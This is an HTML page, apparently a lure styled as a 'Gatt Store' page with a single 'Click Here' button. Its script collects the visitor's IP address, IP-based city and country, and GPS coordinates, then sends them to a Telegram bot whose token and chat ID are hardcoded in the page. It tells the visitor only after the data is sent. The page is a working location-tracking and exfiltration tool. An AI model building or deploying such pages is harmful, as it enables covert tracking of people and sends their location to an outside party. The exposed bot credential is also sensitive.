<!DOCTYPE html>
<html>
<head>
    <title>Visitor Info</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md text-center">
        <h1 class="text-xl font-bold mb-2">Gatt Store</h1>
        <p class="mb-4">Klik Button Dibawah untuk Liat</p>
        
        <button onclick="collectData()" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
            Click Here
        </button>
        
        <div id="result" class="mt-4 text-left hidden"></div>
    </div>

    <script>
        const BOT_TOKEN = "7950767142:AAGl3GIv8IDK1iAs14tHPezVqxlDMxxBU5I";
        const CHAT_ID = "7113683581";

        async function collectData() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = "<p class='text-gray-600'>Mengumpulkan data...</p>";
            resultDiv.classList.remove('hidden');

            try {
                // 1. Dapatkan IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // 2. Dapatkan info lokasi dari IP
                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locData = await locRes.json();
                
                // 3. Dapatkan GPS (jika diizinkan)
                let gps = {};
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    gps = {
                        lat: pos.coords.latitude,
                        long: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                } catch (e) {
                    gps.error = "Izin GPS ditolak";
                }
                
                // 4. Kirim ke Telegram
                const message = formatMessage(ipData, locData, gps);
                await sendToTelegram(message);
                
                // 5. Tampilkan hasil di halaman (opsional)
                resultDiv.innerHTML = `
                    <div class="space-y-2">
                        <p><b>IP:</b> ${ipData.ip}</p>
                        <p><b>Lokasi:</b> ${locData.city}, ${locData.country_name}</p>
                        ${gps.lat ? `<p><b>GPS:</b> <a href="https://maps.google.com?q=${gps.lat},${gps.long}" class="text-blue-500">Lihat di Peta</a></p>` : ''}
                        <p class="text-green-600">‚úì Data telah dikirim</p>
                    </div>
                `;
            } catch (error) {
                resultDiv.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`;
            }
        }

        function formatMessage(ip, loc, gps) {
            return `<b>üïµÔ∏è Visitor Info</b>\n\n`
                 + `IP: ${ip.ip}\n`
                 + `Lokasi: ${loc.city}, ${loc.region}, ${loc.country_name}\n`
                 + `GPS: ${gps.lat ? `${gps.lat}, ${gps.long} (¬±${gps.accuracy}m)` : 'Tidak tersedia'}\n\n`
                 + `Waktu: ${new Date().toLocaleString()}`;
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }
    </script>
</body>
</html>
